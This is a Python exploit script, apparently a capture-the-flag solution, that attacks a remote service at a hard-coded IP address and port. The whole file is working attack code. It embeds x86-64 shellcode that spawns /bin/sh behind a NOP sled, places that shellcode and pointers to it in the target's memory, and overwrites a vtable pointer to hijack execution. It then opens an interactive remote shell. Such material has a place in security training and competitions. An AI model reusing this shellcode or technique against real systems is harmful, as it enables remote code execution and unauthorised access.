import struct
import re
import sys
sys.path.append('../../../tools')
import ctf_socket

exec_shell = (        "\x48\x31\xff\xb0\x69\x0f\x05\x48\x31\xd2\x48\xbb\xff\x2f\x62"
        "\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x48\x31"
        "\xc0\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05\x6a\x01\x5f\x6a\x3c"
        "\x58\x0f\x05")

# Make sure we hit the shellcode
nop_sled = '\x90' * 40



HOST = '54.165.225.121'
PORT = 5333

def main():
    cs = ctf_socket.CTFSocket(HOST, PORT, dump=False)
    cs.recv_until('\n>')

    # Get the shellcode into memory
    cs.send('c 0 ' + nop_sled + exec_shell + '\n')
    data = cs.recv_until('>')
    shellcode_ptr = int(re.search('identifier is: (\d+)', data).group(1))
    print('shellcode_ptr = %X' % shellcode_ptr)

    # Create a second string to get the shellcode pointer into mem
    cs.send('c 0 ' + 'A' * 0x10 + struct.pack('I', shellcode_ptr) + '\n')
    data = cs.recv_until('>')
    second_ptr = int(re.search('identifier is: (\d+)', data).group(1))
    print('second_ptr = %X' % second_ptr)

    # Create a counted string that we will overwrite the vtable pointer for
    cs.send('c 1 m\n')
    data = cs.recv_until('>')
    counted_string_ptr= int(re.search('identifier is: (\d+)', data).group(1))

    # Overwrite the vtable pointer
    cs.send('u ' + str(counted_string_ptr) + ' ' + struct.pack('I', second_ptr) + '\n', dump=True)
    data = cs.recv_until('>')
    overwrite_ptr= int(re.search('identifier is: (\d+)', data).group(1))

    # Exec vtable+10
    cs.send('r ' + str(overwrite_ptr) + '\n')

    sock = cs.sock

    command=''
    while(command != 'exit'):
        command=raw_input('$ ')
        sock.send(command + '\n')#raw_input won't grab a newline
        print(sock.recv(0x10000))

if __name__ == '__main__':
    main()
